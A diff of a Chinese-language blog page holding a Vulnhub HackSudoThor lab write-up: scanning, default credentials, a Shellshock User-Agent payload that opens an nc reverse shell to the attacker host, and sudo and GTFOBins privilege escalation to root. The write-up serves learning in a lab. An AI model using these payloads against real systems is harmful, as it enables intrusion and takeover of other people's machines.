-<p>当 CGI 脚本接收到一次 HTTP 请求 , 它的环境变量就会新增一些条目 , 比如 User-Agent , Connection 等信息。因此 , 在给出的 POC 中 , 我们通过修改 User-Agent 来修改 CGI 环境变量 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">() &#123; :; &#125;; echo; command;</span><br></pre></td></tr></table></figure></p>
+<p>当 CGI 脚本接收到一次 HTTP 请求 , 它的环境变量就会新增一些条目 , 比如 User-Agent , Connection 等信息。因此 , 在给出的 POC 中 , 我们通过修改 User-Agent 来修改 CGI 环境变量 <pre class="line-numbers language-none"><code class="language-none">() &#123; :; &#125;; echo; command;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <blockquote>
 <p>中间那个<code>:</code>可以用其他字符代替，一定要有字符！ 中间那个<code>echo</code> 不能省略。HTTP头部信息每一行都是独立的信息，这里的echo就充当换行符。（不是很能理解这里的意思）</p>
 </blockquote>
@@ -418,7 +279,9 @@
 <h1 id="渗透">渗透</h1>
 <p>kali：10.0.2.4</p>
 <h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.13</span><br><span class="line">sudo nmap -p21,22,80 -sV 10.0.2.13</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> arp-scan -l
+<span class="token function">sudo</span> nmap -p- <span class="token number">10.0</span>.2.13
+<span class="token function">sudo</span> nmap -p21,22,80 -sV <span class="token number">10.0</span>.2.13<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143045.png" /></p>
 <ul>
 <li>21端口的服务为ftp</li>
@@ -428,30 +291,36 @@
 </ul>
 <h2 id="访问http服务">访问http服务</h2>
 <p>页面是一个登陆界面，尝试了一下弱口令，发现没有用。又去看了源码，没有什么有用的新，然后依次又查看了<code>HOME, NEWS, CONCAT, ABOUT US</code>发现都没有什么有用的信息。不过<code>CONCAT</code>下面有许多个人信息，可以尝试一下账号和密码是否与这有关。</p>
-<p>接着进行路径发现。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.13</span><br></pre></td></tr></table></figure></p>
+<p>接着进行路径发现。 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch -u http://10.0.2.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143520.png" /></p>
 <p>先查看一下<code>README.md</code>，在里面发现了这个网站是用一个开源的框架搭建的，并且还给出了地址 https://github.com/zakee94/online-banking-system</p>
-<p>访问网站，找到了下面这句话： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">However some important usernames and passwords are provided below :</span><br><span class="line">Username of admin is &quot;admin&quot; &amp; password is &quot;password123&quot;.</span><br><span class="line">Username of most of the customers is their &quot;first_name&quot; &amp; password is their &quot;first_name&quot; followed by &quot;123&quot;.</span><br></pre></td></tr></table></figure></p>
+<p>访问网站，找到了下面这句话： <pre class="line-numbers language-none"><code class="language-none">However some important usernames and passwords are provided below :
+Username of admin is &quot;admin&quot; &amp; password is &quot;password123&quot;.
+Username of most of the customers is their &quot;first_name&quot; &amp; password is their &quot;first_name&quot; followed by &quot;123&quot;.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
 <p>给出了admin用户的默认账号和密码，以及普通用户的默认账号和默认密码格式。</p>
 <p>除此之外，还扫描出了<code>admin_login.php</code>。这很明显应该是后台登录地址。尝试刚刚获得的默认账号和密码进行登陆。发现直接登录成功了！</p>
 <p>在网站进行信息收集，发现该网站存在着业务逻辑漏洞，也就是可以从后台看到所有人的账号和密码，还可以利用这些密码进行转账，因为该网站没有严格限制登陆密码和支付密码不能一致，所以现存的账号的登录密码和支付密码一致，因此可以盗用这些账号密码，然后登录，之后给自己的账号转账即可。虽然业务逻辑漏洞在打靶过程中没有什么用，但是在现实生活中是直接造成经济损失的。</p>
 <h2 id="破壳漏洞get-shell">破壳漏洞get shell</h2>
 <p>之前在源码中看到了<code>&lt;!-- cgi-bin --&gt;</code>这其实就是使用了CGI技术，使用该技术可能存在着一种漏洞，那就是<strong>破壳漏洞</strong>！</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.13/cgi-bin/ -f -e cgi,sh</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch -u http://10.0.2.13/cgi-bin/ -f -e cgi,sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152211.png" /></p>
 <p>500：表示我们提交的参数在执行过程中发生了错误，但是不代表我们访问的文件不存在，反而证明文件应该是存在的。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=ls 10.0.2.13</span><br><span class="line"><span class="comment"># http-shellshock 专门用来测试是否存在破壳漏洞</span></span><br><span class="line"><span class="comment"># 如果最后的命令执行成功，说明存在漏洞</span></span><br><span class="line"><span class="comment"># uri=/cgi-bin/shell.sh 要检测的文件路径</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap -p80 --script http-shellshock --script-args <span class="token assign-left variable">uri</span><span class="token operator">=</span>/cgi-bin/shell.sh,cmd<span class="token operator">=</span>ls <span class="token number">10.0</span>.2.13
+<span class="token comment"># http-shellshock 专门用来测试是否存在破壳漏洞</span>
+<span class="token comment"># 如果最后的命令执行成功，说明存在漏洞</span>
+<span class="token comment"># uri=/cgi-bin/shell.sh 要检测的文件路径</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152316.png" /></p>
 <p>发现确实存在破壳漏洞。也可以对<code>backup.cgi</code>进行测试一下。下面的代码就利用（<code>-A</code>等价于<code>-H</code>，都是指定<code>user-agent</code>）</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent:() &#123; :; &#125;; echo; /bin/bash -c &#x27;which nc&#x27;&quot;</span> \http://10.0.2.13/cgi-bin/shell.sh</span><br><span class="line"><span class="comment"># 如果存在nc，就可以利用nc反弹。先用-e的尝试一下，如果不可以再用nc串联</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -H <span class="token string">"user-agent:() &#123; :; &#125;; echo; /bin/bash -c 'which nc'"</span> <span class="token punctuation">\</span>http://10.0.2.13/cgi-bin/shell.sh
+<span class="token comment"># 如果存在nc，就可以利用nc反弹。先用-e的尝试一下，如果不可以再用nc串联</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412172426.png" /></p>
-<p>此时能够百分之百确定存在破壳漏洞。接着反弹shell <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent:() &#123; :; &#125;; echo; echo; /bin/bash -c &#x27;nc -e /bin/bash 10.0.2.4 4444&#x27;&quot;</span> \http://10.0.2.13/cgi-bin/shell.sh</span><br></pre></td></tr></table></figure></p>
+<p>此时能够百分之百确定存在破壳漏洞。接着反弹shell <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -H <span class="token string">"user-agent:() &#123; :; &#125;; echo; echo; /bin/bash -c 'nc -e /bin/bash 10.0.2.4 4444'"</span> <span class="token punctuation">\</span>http://10.0.2.13/cgi-bin/shell.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412154821.png" /></p>
 <p>反弹成功！</p>
 <h2 id="权限提升">权限提升</h2>
 <p>首先查看一下sudo配置<code>sudo -l</code></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155743.png" /></p>
-<p>发现了奇怪的东西，我们尝试执行一下 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u thor /home/thor/./hammer.sh</span><br></pre></td></tr></table></figure></p>
+<p>发现了奇怪的东西，我们尝试执行一下 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> -u thor /home/thor/./hammer.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p>然后要求我们输入，我们输入几条系统命令看一下</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155919.png" /></p>
 <p>猜测：第一个输入点，无论我们输入什么都会被返回；而第二个输入点则会执行命令。刚刚的<code>id</code>可以看出，该程序的权限是<code>thor</code>，如果该程序执行<code>bash</code>则会得到<code>thor</code>权限的bash。</p>
@@ -464,7 +333,7 @@
 <p>网站中提到</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160423.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160429.png" /></p>
-<p>因为我们需要提权到root，所以使用后者中的<code>Shell</code>的命令，也就是如下命令： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/sbin/service ../../bin/bash</span><br></pre></td></tr></table></figure></p>
+<p>因为我们需要提权到root，所以使用后者中的<code>Shell</code>的命令，也就是如下命令： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> /usr/sbin/service <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160607.png" /></p>
 <p>成功提权到root！接下来获取第二个flag<code>/root/root.txt</code></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160550.png" /></p>
@@ -475,112 +344,164 @@
 <p>该靶机的难度主要在于<strong>破壳漏洞</strong>的发现以及 <strong>GTFOBins漏洞</strong>利用。练习这么多个靶机以来第一次碰到这样的漏洞以及利用方式。</p>
 <p>还有一点，就是如果发现目标站点使用的是开源的框架，可以尝试以下默认的账号和密码。</p>
 
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
     </div>
 
-    
-    
-    
 
-    <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/%E7%BB%BC%E5%90%88/" rel="tag"># 综合</a>
-              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
-              <a href="/tags/%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E/" rel="tag"># 破壳漏洞</a>
-              <a href="/tags/%E5%BC%80%E6%BA%90%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" rel="tag"># 开源源码泄露</a>
-              <a href="/tags/GTFOBins%E6%8F%90%E6%9D%83/" rel="tag"># GTFOBins提权</a>
-          </div>
 
         
+          <div id="footer-post-container">
+  <div id="footer-post">
 
-          <div class="post-nav">
-            <div class="post-nav-item">
-                <a href="/2022/04/12/%E5%A4%8D%E7%8E%B0%EF%BC%9ABash%20Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89/" rel="prev" title="复现：Bash Shellshock 破壳漏洞（CVE-2014-6271）">
-                  <i class="fa fa-chevron-left"></i> 复现：Bash Shellshock 破壳漏洞（CVE-2014-6271）
-                </a>
-            </div>
-            <div class="post-nav-item">
-                <a href="/2022/04/13/SWPU2019%20Web1/" rel="next" title="SWPU2019 Web1">
-                  SWPU2019 Web1 <i class="fa fa-chevron-right"></i>
-                </a>
-            </div>
-          </div>
-    </footer>
-  </article>
-</div>
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
 
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#common-gateway-interface-%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">Common Gateway Interface 基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">破壳漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">3.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF"><span class="toc-number">3.2.</span> <span class="toc-text">前置技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bash%E5%9F%BA%E7%A1%80"><span class="toc-number">3.2.1.</span> <span class="toc-text">bash基础</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC"><span class="toc-number">3.3.</span> <span class="toc-text">影响的版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-number">3.5.</span> <span class="toc-text">利用分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">3.6.</span> <span class="toc-text">利用场景</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">4.1.</span> <span class="toc-text">主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.2.</span> <span class="toc-text">访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Eget-shell"><span class="toc-number">4.3.</span> <span class="toc-text">破壳漏洞get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.4.</span> <span class="toc-text">权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
 
-
-
-
-
-    
-  <div class="comments" id="disqus_thread">
-    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
-  </div>
-  
-</div>
-  </main>
-
-  <footer class="footer">
-    <div class="footer-inner">
-
-
-<div class="copyright">
-  &copy; 
-  <span itemprop="copyrightYear">2022</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">hdfzzf</span>
-</div>
-<div class="wordcount">
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-chart-line"></i>
-    </span>
-      <span>站点总字数：</span>
-    <span title="站点总字数">534k</span>
-  </span>
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-      <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">8:05</span>
-  </span>
-</div>
-<div class="busuanzi-count">
-</div>
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&text=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&title=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&is_video=false&description=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=10 Vulnhub HackSudoThor Writeup&body=Check out this article: https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&title=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&title=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&title=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&title=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&name=10 Vulnhub HackSudoThor Writeup&description=&lt;p&gt;该靶机难度为中等，主要是&lt;strong&gt;破壳漏洞&lt;/strong&gt;为第一次遇到，有点没底。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&t=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
 
     </div>
-  </footer>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    hdfzzf
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
 
   
-  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
-
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
   
-<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
-<script src="/js/third-party/search/local-search.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
 
 
+<script src="/js/main.js"></script>
 
+<!-- search -->
 
+<!-- Google Analytics -->
 
-  
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- Baidu Analytics -->
 
+<!-- Cloudflare Analytics -->
 
+<!-- Umami Analytics -->
 
+<!-- Disqus Comments -->
 
-  
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
 
-  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
-<script src="/js/third-party/math/mathjax.js"></script>
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
 
-
-<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"hdfzzf","count":true,"i18n":{"disqus":"disqus"}}</script>
-<script src="/js/third-party/comments/disqus.js"></script>
+<!-- utterances Comments -->
 
 </body>
 </html>
